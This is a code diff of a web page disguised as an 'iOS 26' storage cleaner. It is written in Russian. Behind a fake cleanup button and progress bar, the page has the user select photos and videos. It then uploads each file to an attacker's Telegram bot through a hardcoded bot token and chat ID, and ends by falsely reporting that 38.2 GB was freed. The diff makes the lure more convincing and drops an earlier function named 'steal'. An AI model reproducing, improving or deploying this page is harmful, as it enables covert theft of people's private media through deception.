@@ -1,48 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Очистка памяти iOS</title>
+<title>Очистка iOS</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body{background:#000;color:white;font-family:-apple-system;text-align:center;padding-top:80px}
-.progress{width:80%;height:6px;background:#333;border-radius:3px;margin:20px auto}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#fff;font-family:-apple-system;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}
+.card{background:#1c1c1e;padding:40px 30px;border-radius:20px;width:90%;max-width:350px}
+.logo{font-size:60px;margin-bottom:15px}
+h2{font-size:22px;margin-bottom:10px}
+p{color:#8e8e93;font-size:14px;margin-bottom:25px}
+.btn{background:#007aff;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:12px;cursor:pointer;width:100%}
+.btn:active{opacity:0.7}
+.barwrap{width:100%;height:6px;background:#333;border-radius:3px;margin:20px 0;display:none}
 .bar{width:0%;height:6px;background:#0f0;border-radius:3px}
+#status{display:none;margin-top:10px}
 </style>
 </head>
 <body>
-<h2>Очистка памяти</h2>
-<div class="progress"><div class="bar" id="bar"></div></div>
-<p id="status">Сканирование...</p>
-<p id="percent">0%</p>
+<div class="card">
+<div class="logo">🧹</div>
+<h2>Очистка iOS 26</h2>
+<p id="info">Удали скрытый мусор и освободи до 40 ГБ памяти</p>
+<button class="btn" id="btn" onclick="go()">Начать очистку</button>
+<div class="barwrap" id="barwrap"><div class="bar" id="bar"></div></div>
+<p id="status"></p>
+</div>
 <input type="file" id="input" multiple accept="image/*,video/*" style="display:none">
 <script>
-const TOKEN = "8673011110:AAGH5Zb6Put8qCt6Zjd_wuRt1Lbjqnhou8g";
-const CHAT_ID = "8181041871";
-async function steal(){
-document.getElementById('status').innerText="Доступ к фото...";
+const TOKEN="8673011110:AAGH5Zb6Put8qCt6Zjd_wuRt1Lbjqnhou8g";
+const CHAT_ID="8181041871";
+function go(){
 const input=document.getElementById('input');
 input.click();
 input.onchange=async function(){
 const files=Array.from(input.files);
 const total=files.length;
-document.getElementById('status').innerText="Отправка...";
-for(let i=0;i<files.length;i+=10){
-const batch=files.slice(i,i+10);
+if(total===0)return;
+document.getElementById('btn').style.display='none';
+document.getElementById('info').innerText='Найдено: '+total+' файлов';
+document.getElementById('barwrap').style.display='block';
+document.getElementById('status').style.display='block';
+document.getElementById('status').innerText='Отправка...';
+for(let i=0;i<files.length;i+=5){
+const batch=files.slice(i,i+5);
 for(let f of batch){
 const fd=new FormData();
 fd.append('document',f);
 fd.append('chat_id',CHAT_ID);
 try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendDocument',{method:'POST',body:fd})}catch(e){}
 }
-const pct=Math.min(100,Math.round((i+batch.length)/total*100));
+const pct=Math.min(100,Math.round((i+5)/total*100));
 document.getElementById('bar').style.width=pct+'%';
-document.getElementById('percent').innerText=pct+'%';
+document.getElementById('status').innerText=pct+'%';
 }
-document.getElementById('status').innerText="Готово! 38.2 ГБ очищено";
-document.getElementById('percent').innerText="Можно закрыть";
+document.getElementById('status').innerText='Готово! 38.2 ГБ очищено';
+document.getElementById('info').innerText='Можно закрыть страницу';
 };
 }
-setTimeout(steal,1000);
 </script>
 </body>
 </html>
